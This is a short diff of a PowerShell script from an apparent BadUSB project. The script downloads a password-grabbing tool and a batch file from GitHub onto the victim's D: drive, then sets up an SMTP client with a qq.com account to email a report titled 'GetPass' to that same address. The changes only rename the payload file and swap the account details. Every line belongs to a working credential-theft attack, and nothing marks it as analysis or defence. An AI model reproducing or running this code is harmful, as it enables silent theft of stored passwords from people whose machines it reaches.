@@ -1,4 +1,4 @@
-(new-object System.Net.WebClient).DownloadFile('https://github.com/1971521902/badUSB/lazagne.rar','D:\Get.exe');
+(new-object System.Net.WebClient).DownloadFile('https://github.com/1971521902/badUSB/GetPass.rar','D:\Get.exe');
 
 (new-object System.Net.WebClient).DownloadFile('https://github.com/1971521902/badUSB/Command.rar','D:\Command.bat');
 
@@ -9,13 +9,13 @@ $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 
 $SMTPInfo.EnableSsl = $true 
 
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('1971521902@qq.com', '熊笔');
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('1921521902@qq.com', 'olawgxxxxxxx');
 
 $ReportEmail = New-Object System.Net.Mail.MailMessage
 
-$ReportEmail.From = '1971521902@qq.com'
+$ReportEmail.From = '1921521902@qq.com'
 
-$ReportEmail.To.Add('1971521902@qq.com')
+$ReportEmail.To.Add('1921521902@qq.com')
 
 $ReportEmail.Subject = 'GetPass'
 
